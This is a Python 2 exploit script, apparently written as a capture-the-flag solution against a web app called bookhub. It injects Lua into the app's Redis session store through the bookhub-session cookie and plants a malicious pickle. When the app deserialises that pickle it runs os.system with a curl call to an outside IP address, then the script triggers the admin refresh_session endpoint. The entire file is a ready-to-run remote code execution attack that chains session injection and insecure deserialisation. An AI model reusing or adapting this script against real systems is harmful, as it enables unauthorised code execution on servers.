import cPickle
import os
import requests
import re
import urllib

DEBUG = 0

URL = "http://18.213.16.123:5000/" if not DEBUG else "http://127.0.0.1:5000/"

class exp(object):
    def __reduce__(self):
        listen_ip = "123.207.90.143"
        listen_port = 1234
        s = """curl 123.207.90.143:1234"""
        return (os.system,(s,))

e = exp()
s = cPickle.dumps(e)
s_bypass = ""
for i in s:
    s_bypass +="string.char(%s).."%ord(i)
evilcode = '''redis.call("set","bookhub:session:tianji",%s)'''%s_bypass[:-2]
payload = '''2047a141-2493-4f81-b315-8b8d95d3db33",%s,"bookhub:session:tianji'''%evilcode
payload = payload.replace(" ","")


if __name__ == '__main__':
    headers = {
        "Cookie": 'bookhub-session=%s' % payload,
        "Content-Type": "application/x-www-form-urlencoded",
        'X-CSRFToken': '',
    }

    print headers["Cookie"]

    res = requests.get(URL + 'login/', headers=headers)
    if res.status_code == 200:
        html = res.content
        r = re.findall(r'csrf_token" type="hidden" value="(.*?)">', html)
        if r:
            headers['X-CSRFToken'] = r[0]
            # refresh_session
            data = {'submit': '1'}
            res = requests.post(URL + 'admin/system/refresh_session/',
                           data=data, headers=headers)
            if res.status_code == 200:
                print(res.content)
            else:
                print(res.content)
            # fuck
            headers['Cookie'] = 'bookhub-session=tianji'
            res = requests.get(URL + 'login/', headers=headers)
            if res.status_code == 200:
                print(res.content)
            else:
                print(res.content)
